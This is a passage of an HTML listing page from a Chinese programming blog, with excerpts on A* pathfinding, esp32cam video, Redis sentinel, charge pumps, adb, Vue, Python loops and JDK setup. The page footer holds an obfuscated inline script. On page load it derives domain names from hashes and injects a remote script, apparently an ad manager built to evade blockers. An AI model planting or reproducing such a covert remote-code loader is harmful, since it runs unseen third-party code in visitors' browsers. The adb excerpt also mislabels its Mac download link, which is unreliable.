一、A* 算法原理 A* 算法是专门用来求解地图中最短路径的算法，同样的算法有很多，但实际中最常用的就是A*算法。 举个例子来说，A*算法通常要将地图网格化，如下图所示：
假设有一只乌龟在追小白兔，乌龟此时的位置是（2,2），小白兔的位置是（6,6），假设小白兔静止不动。
根据A *算法的原理，乌龟只能向左、向右、向上、向下走，那么（1,2）、（2,1）、（3,2）、（2,3）是乌龟下一轮可以到达的点，这些点叫做 待探索的点
步骤一
寻找下一步可以到达的节点，将这些待探索的点加入待探索数组 frontier 中，也叫边界数组。
计算出新加入点的代价，代价 = 当前代价 + 预估代价 ， 公式表达为 F= G + H
所谓 当前代价 G 就是从起点到达当前点所经过的路程，例如（1,2）、（2,1）、（3,2）、（2,3）这四个点的当前代价都等于（2,2）点到达其所需的路程，即为 1 。
所谓 预估代价 H 就是从当前点到终点的曼哈顿距离（横纵坐标差值之和，| x1 - x2| + |y1 - y2|）
所以（1,2）、（2,1）、（3,2）、（2,3）四个待探索点的预估代价分别为9、9、7、7 。
当前代价 / 预估代价结果如下图所示：
步骤二
将待探索点按照代价的大小升序排序，则排序后的待探索数组中待探索点的顺序为
（3,2）、（2,3）、（1,2）、（2,1）
接着取出第一个，即代价最小的点作为小乌龟的此轮目标点，即为下一轮的起始点，并把该点从待探索数组 frontier 中删去 ，加入 已探索数组 already_frontier 中，则会得到下面的情况：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7cd93de7301946ed6a21b85b86daaa29/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1894b4073adfa53a5679e167e125f651/" rel="bookmark">
			esp32cam 服务端远程视频方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		esp32cam 服务端远程视频方案 现有功能更完善的服务端视频方案。
开源地址:https://gitcode.net/qq_26700087/lightcam
功能更全的esp32监控
部署起来会麻烦一些，但功能更加完善 说明 本方案为esp32cam 服务端 浏览器 三端联合使用。将服务端部署在公网即可远程使用，没有远程需求，可以直接在局域网使用。代码无需修改。
本文取缔了esp32cam自身运行http服务的相关逻辑，使得esp32cam只负责不停拍照片发给服务端，从而减少esp32cam的压力，提升了其视频流畅度。
本文代码开源地址:https://gitcode.net/qq_26700087/simpleVideoServer,该项目的比当前文章更新，更加流畅,并且支持合宙ESP32S3。如果使用本文的代码，则使用本文提供链接中的发行版文件。使用该项目最新代码，请使用该项目的页面提供的下载服务端链接下载服务端发行版
帧 mjpeg视频流 esp32cam SimpleVideoServer 浏览器 一种较为流畅的esp32cam远程视频方案
您需要准备 物料说明esp32cam开发板esp32cam，本人是使用其自带摄像头，代码仅仅在其自带摄像头下测试一台装有windows或者linux操作系统的计算机用于运行服务端USB转TTL模块/或底座用于烧录/串口监控杜邦线若干用于io0接地/使用底座烧录不需要 鄙人无MacOs系统PC，未对MacOS进行测试。但服务端由java编写，自行下载macOS版本的jdk17，运行服务端，理论上不会有问题
也可以将java源代码重新编译，甚至移植到安卓App上。
本文以windows系统为例，使用安信可家esp32cam模块 和安信可家USB转TTL CP2012模块。
烧录esp32cam 本文以ardunio 框架开发，你可以选择 ardunio ide 编译和烧录
或者platformio(基于vs code/clion)新建项目选择 以ardunio framework新建。
ardunio ide 准备esp32cam环境 1.追加附加板地址 打开菜单 -&gt; 文件 -&gt; 首选项
在附加开发板管理器网址中追加一行
https://dl.espressif.com/dl/package_esp32_index.json 最近出现了下面这个地址，这个是esp32 的2.0环境，一些新特性需要，可能不需要上方的那个json。
https://raw.githubusercontent.com/espressif/arduino-esp32/gh-pages/package_esp32_dev_index.json 2.安装esp32环境 在 工具 -&gt; 开发板 -&gt; 开发板管理器里 搜索 esp32 点击进行安装。
此处可能需要把dns修改为腾讯或者阿里公共dns，才容易成功。
3.新建项目 选择esp32cam
platformio 准备esp32cam环境 新建项目找到 AI Thinker ESP32-CAM，则选择了开发板。框架选择 ardunio。若没有初始化esp32环境，会自动下载，同样建议修改dns。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1894b4073adfa53a5679e167e125f651/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/29134aa48d29da428347b06fbb265c42/" rel="bookmark">
			centos7.9搭建redis6.0.6哨兵模式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		redis6.0.6哨兵模式搭建文档 1.准备工作1.1 ip规划安装依赖（三台机器都操作）1.3 gcc升级（三台机器都操作） 2.安装redis（三台机器都操作）2.1 获取安装包2.2 解压2.3 编译2.4 验证上一步是否正确2.5 安装2.6 拷贝配置文件到安装目录2.7 修改配置文件2.8 修改slave1和slave2的配置文件（注：只在只读节点执行）2.9 启动redis（三台全启动，先启动master）2.10 验证主从模式 3.部署哨兵（三台操作）3.1 创建哨兵工作目录3.2 修改哨兵配置文件3.3 启动哨兵（三台都执行） 4.设置开机自启动（三台都执行）5.开启密码5.1 redis开启密码（三台操作，因为哨兵模式需要master转移）5.2 sentinel添加master密码（三台操作） ) 1.准备工作 本次搭建使用一主二从三哨兵，哨兵模式在主从复制的基础上，引入了主节点的自动故障转移
1.1 ip规划 主机ipmaster192.168.19.111slave1192.168.19.200slave2192.168.19.201 安装依赖（三台机器都操作） yum install -y gcc-c++ automake autoconf libtool make tcl 1.3 gcc升级（三台机器都操作） 因为redis6版本对gcc编译的版本要求较高，需要升级gcc版本
#安装gcc编译器 yum -y install gcc #升级gcc版本 yum -y install centos-release-scl yum -y install devtoolset-9-gcc devtoolset-9-gcc-c++ devtoolset-9-binutils scl enable devtoolset-9 bash 2.安装redis（三台机器都操作） 2.1 获取安装包 cd /root wget https://download.redis.io/releases/redis-6.0.6.tar.gz 2.2 解压 tar fx redis-6.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/29134aa48d29da428347b06fbb265c42/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9a057b577b6081c68f50ad495aa1fddd/" rel="bookmark">
			charge pump的分析与应用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		春节前最后一更，提前祝大家新春快乐，阖家安康，工作顺利！
定义：
电荷泵是利用电容的充放电来实现电压的转换的，输入回路和输出回路轮流导通。通过调节占空比来调节输出电压。
它们能使输入电压升高或降低，也可以用于产生负电压。其内部的FET开关阵列以一定方式控制快速电容器的充电和放电，从而使输入电压以一定因数(0.5,2或3)倍增或降低，从而得到所需要的输出电压。这种特别的调制过程可以保证高达80%的效率，而且只需外接陶瓷电容。由于电路是开关工作的，电荷泵结构也会产生一定的输出纹波和EMI(电磁干扰)。
电荷泵仅用外部电容器即可提供±2倍的输出电压。其损耗主要来自电容器的等效串联电阻（ESR)和内部开关晶体管的RDS（ON）。电荷泵转换器不使用电感器，因此其辐射EMI可以忽略。
应用：
A:RS-232电平转换，能够把5V或3.3V电源供电转换为正负高压。
B:能够用来驱动LCD或者LED，从一个低压供电电源，例如电池中产生一个高的基准电压。
C：用于EEPROM跟flash IC内部，生成额外的高压，例如+12V for erasing.
D:用来驱动门阵列，高边NMOS管跟IGBT，例如bootstrap,可以产生比输入电压更高的电压去驱动mos管。
电路分析：
正升压输出：
电容左边是PWM波形：
当PWM为0时：
V1通过二极管D2，D1对C2，C1充电。
电容C1右端的电压为：V1-Vd
理想情况下：Vout（max）=V1-2*Vd
当PWM为1时：
由于电容两端的电压不能突变
C1右边的电压则变为：V1-Vd+V2
理想情况下：Vout（max）=V1-Vd+V2-Vd
当PWM再次变为0时：
由于D1与C2的存在，能使短时间内电压维持住。
注意：charge pump能够输出的电流较小，选取IC或者自己搭建的时候，要考虑Iout(max)的余量。
下面给大家上个原理图赏析：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fbad09242e3c2165ff99b3f2234c33de/" rel="bookmark">
			adb基本使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		安卓adb:
Windows版本：https://dl.google.com/android/repository/platform-tools-latest-windows.zip
Mac版本：https://dl.google.com/android/repository/platform-tools-latest-windows.zip
Linux版本：https://dl.google.com/android/repository/platform-tools-latest-linux.zip
下载安装包后解压到自定义文件夹，然后将安装地址添加到环境变量的path里面
打开电脑的系统设置，找到环境变量，把路径地址添加到path里面，win+r输入：control system,选择高级系统设置，
android四大组件：
1、activity
APP里一切活动都可以认为是一个activity，比如一个页面，一个控件，调用某一个接口等
AndroidManifest.xml：是每个APP里必须要有的一个文件，货物清单，列举APP里面的清单
2、service（后台服务）
3、broadcast receiver 广播接收
举例：手机电量提醒、网络异常、屏幕关闭/点亮
4、centent provider 内容提供
adb install 安装命令：
adb install +安装包路径
如果同时连接了多台手机，必须在命令中指定要在哪台手机上进行安装，使用参数-s参数+手机序列号
adb -s +手机序列号 install +安装包路径
卸载：adb uninstall +包名
adb shell dumpsys window |findstr mCurrentFocus---打开要卸载的应用再执行该命令
例如：来付APP，打开，执行该命令 就可获得包名
如果应用不多，可以使用adb shell pm list package -3,见字识义
adb shell pm list package -3 查询手机上的第三方应用程序
如图：
找到对应的包名，直接adb uninstall +包名 回车就可以卸载应用程序了
adb uninstall com.laifu.laopio.site adb shell 用法： 1、adb shell回车:相当于进入这个程序内部了，我们就可以执行Linux命令（简化版的Linux）输入exit退出
2、直接在adb shell后面跟上需要执行的Linux命令，可以不用进入Linux环境，直接执行命令
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fbad09242e3c2165ff99b3f2234c33de/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2c3c08af37e7790dd0b0e6a9690c1183/" rel="bookmark">
			【vue运行报错】There are multiple modules with names... 报错原因和解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		项目场景： There are multiple modules with names that only differ in casing.
项目运行时候报错如下：
There are multiple modules with names that only differ in casing. ：有多个模块同名仅大小写不同。
This can lead to unexpected behavior when compiling on a filesystem with other case-semantic. ： 这可能导致在一些文件系统中产生不是预期的行为。
Use equal casing. ： 使用唯一的写法。
问题描述 vue运行时项目报错：
There are multiple modules with names that only differ in casing. This can lead to unexpected behavior when compiling on a filesystem with other case-semantic.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2c3c08af37e7790dd0b0e6a9690c1183/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/44cb0eabe4ecb2e701012219ad9e5d01/" rel="bookmark">
			【Python入门篇】——Python中循环语句（while循环的嵌套应用，嵌套案例）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		作者简介： 辭七七，目前大一，正在学习C/C++，Java，Python等
作者主页： 七七的个人主页
文章收录专栏： Python入门，本专栏主要内容为Python的基础语法，Python中的选择循环语句，Python函数，Python的数据容器等。
欢迎大家点赞 👍 收藏 ⭐ 加关注哦！💖💖
Python中循环语句 1. while循环的嵌套应用2. while循环的嵌套案例 1. while循环的嵌套应用 while循环可以两个或多个嵌套使用，下面让我们看一下如何嵌套吧！
while循环的嵌套格式
下面让我们来看一个简单的嵌套循环
i = 1 while i &lt;=100: print(f"今天是第{i}天，准备写博客.....") # 内层循环的控制变量 j = 1 while j &lt;= 3: print(f"七七写了{j}篇博客") j += 1 print("七七完成任务了") i += 1 print(f"坚持到第{i - 1}天，七七成为超级大博主") 打印结果如下：
外部循环会打印100次今天是第{i}天，准备写博客.....，内部循环打印3次七七写了{j}篇博客和七七完成任务了
while循环的嵌套的注意点
同判断语句的嵌套一样，循环语句的嵌套，要注意空格缩进。
（基于空格缩进来决定层次关系 ）
注意条件的设置，避免出现无限循环（除非真的需要无限循环）
总结：
嵌套循环的语法格式：
嵌套循环需要注意的地方: 注意条件的控制，避免无限循环多层嵌套，主要空格缩进来确定层次关系 嵌套循环的使用难点： 循环条件的控制，层次越多越复杂，需要细心+耐心 2. while循环的嵌套案例 题目：使用while嵌套循环，打印九九乘法表
在这里我们补充一个知识-print输出不换行
默认print语句输出内容会自动换行
如下图所示：
在即将完成的案例中，我们需要使用print语句，输出不换行的功能，非常简单，实现方式如下：
如图，在print语句中，加上 end=’’ 即可输出不换行了
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/44cb0eabe4ecb2e701012219ad9e5d01/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fdb2eec4a0a5a2612cbc88ce0380d0a4/" rel="bookmark">
			提高准时交货率有哪些措施
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		准时交货率一般是指一段时间内，企业准时交货占总交货次数的百分比。即准时交货率＝（准时交货的总数／总订单数）X 100%。概念看上去很简单，但涉及的流程环节很多，想要提高企业的准时交货率不是一件容易的事情。
之前有分析过准时交货率低可能的原因，今天来看看有什么办法提高制造企业的准时交货率。还是从两个大的方面入手：
一是供应商管理和优化。在整个供应链环节中，一个环节“掉链子”，就可能会影响到整个下游行业。但如果企业采取高库存的方式，会增加企业的库存管理成本，增加库存占用的资金，减少流动资金，也可能会存在着降价、滞销等市场风险。总的来说，做好供应商管理是非常重要的一点。
做好供应商管理，笔者认为，首先企业要给到供应商准确、详细的需求计划。供应商的生产交货也需要一定的周期，频繁变动反而会让供应商混乱，造成工期延误。第二，需要配备专业的人才和团队，包括采购、质量管控、交付、合同等等，熟悉了解供货市场更容易与供应商联系起来，建议长期合作关系。第三是优化采购供货的流程，在帮助节省时间、减少错误问题的同时也能在一定程度上降低成本。第四，可以借助数字化系统工具，在库存管理、订单管理、审批等方面更加自动化，管控和改善整个流程。羚号工厂含有WMS系统，也在致力于为制造企业解决仓储管理难题。
二是优化管理企业的各个流程，提高生产技术及能力。生产能力和技术是否能满足客户和市场的需求是不被行业淘汰的关键点之一，从采购到生产到交货，准时交货需要每个环节的协同和合作。当然，这一点并不是上系统就能解决的事情。而是应该首先梳理整个生产管理流程，形成完整的逻辑闭环，经过评估，如有需要再将困难的事情交给数字化系统帮助。
回到更加具体的环节，物料齐套问题、销售订单预测差异大、频繁紧急插单、生产异常响应不及时等等都会影响到准时交货的问题。提升需要共同努力
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f0c80fd337b2cf9d111f425de1c955d7/" rel="bookmark">
			linux 下如何配置JDK呢？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		系统Ubuntu，下载jdk-9.0.1
1，切换到root ,创建文件夹
xxxx@ubuntu:~$ sudo su
root@ubuntu:~# mkdir /usr/java
2，找到下载的jdk-9.0.1_linux-x64_bin.tar.gz，然后复制到刚才创建的 /usr/java目录下
root@ubuntu:~# cd /mnt/hgfs/share
root@ubuntu:/mnt/hgfs/share# cp jdk-9.0.1_linux-x64_bin.tar.gz /usr/java/
3，进入/usr/java目录，解压文件
root@ubuntu:~# cd /usr/java/
root@ubuntu:/usr/java# tar -zxvf jdk-9.0.1_linux-x64_bin.tar.gz
解压后得到jdk-9.0.1
root@ubuntu:/usr/java# ls
jdk-9.0.1 jdk-9.0.1_linux-x64_bin.tar.gz
4，配置环境变量
打开profile（用gedit了哈）
root@ubuntu:/usr/java# gedit /etc/profile
复制下面的代码放到文件最后边，保存，注意jdk的文件名（看你自己安装jdk的是哪个版本）
export JAVA_HOME=/usr/java/jdk-9.0.1
export CLASSPATH=$JAVA_HOME/lib/
export PATH=$PATH:$JAVA_HOME/bin
export PATH JAVA_HOME CLASSPATH
5，配置立即生效　source /etc/profile
root@ubuntu:/usr/java# source /etc/profile
6，查看是否安装成功
root@ubuntu:~# java -version
java version "9.0.1"
Java(TM) SE Runtime Environment (build 9.0.1+11)
Java HotSpot(TM) 64-Bit Server VM (build 9.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f0c80fd337b2cf9d111f425de1c955d7/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/139/">«</a>
	<span class="pagination__item pagination__item--current">140/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/141/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>